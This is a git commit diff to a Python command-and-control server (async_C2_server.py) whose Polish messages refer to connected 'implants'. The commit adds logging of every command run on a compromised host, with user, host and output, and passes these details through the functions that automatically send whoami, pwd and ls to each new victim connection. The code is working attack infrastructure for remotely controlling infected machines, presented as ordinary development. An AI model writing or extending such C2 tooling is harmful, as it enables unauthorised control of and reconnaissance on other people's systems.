685ce0d52ea698acb344df2a09bee9a833b67a05
Therr <133943286+ctr-alt-f3@users.noreply.github.com>
2025-12-31 14:19:52 +0100

    Enhance command execution with logging
    Added logging functionality to track executed commands.

--- async_C2_server.py
+++ async_C2_server.py
@@ -3,9 +3,11 @@ from threading import *
 from time import *
 from asyncio import *
 from uuid import *
+from aiofiles import * 
+import datetime
 sesje = {}
 
-async def run_cmd(reader, writer, command):
+async def run_cmd(reader, writer, command, host, user):
     granica = str(uuid4()).encode()
     full_cmd = command.encode()+b'; echo -n '+ granica + b'\n'
     try:
@@ -19,11 +21,13 @@ async def run_cmd(reader, writer, command):
         try:
             chunk = await wait_for(reader.read(4096),timeout=5)
             if not chunk:
-                raise ConnectionError("[-]problem z połączeniem z implantem")
+                raise ConnectionError(f"[-]problem z połączeniem z implantem {user}@{host}")
             odp+=chunk
         except TimeoutError:
-            raise ConnectionError("[-]timeout ended")
+            raise ConnectionError(f"[-]timeout of {user}@{host} ended")
     output = odp.rsplit(granica,1)[0]
+    async with open (f'logs/main.log',mode='a') as log:
+        await log.write(f"\n[{datetime.datetime.now()}] command {command} executed as {user}@{host} with output:\n {str(output.strip().decode())}")
     return output.strip()
 
 
@@ -34,14 +38,14 @@ async def handler(reader,writer):
     print(f"[N] znaleziono połączenie z {addr}")
     sesje[addr] = writer
     try:    
-        output = await run_cmd(reader,writer,"whoami")
-       # print(f"[C] komenda whoami dla {addr} wysłana")
+        username = "{C2_unknown}"
+        output = await run_cmd(reader,writer,"whoami", addr, username)
         username = output.decode().strip()  
         print(f"[I] kolega {addr} ma na imie {username}")
-        pwd = await run_cmd(reader, writer, "pwd")
+        pwd = await run_cmd(reader, writer, "pwd", addr, username)
         pwd = pwd.decode().strip()
         print(f"[I] kolega {username}@{addr} znajduje się w {pwd}")
-        ls = await run_cmd(reader,writer, "ls")
+        ls = await run_cmd(reader,writer, "ls", addr, username)
         ls = ls.decode().strip()
         print(f"[I] ls dla {username}:\n {ls}")
 
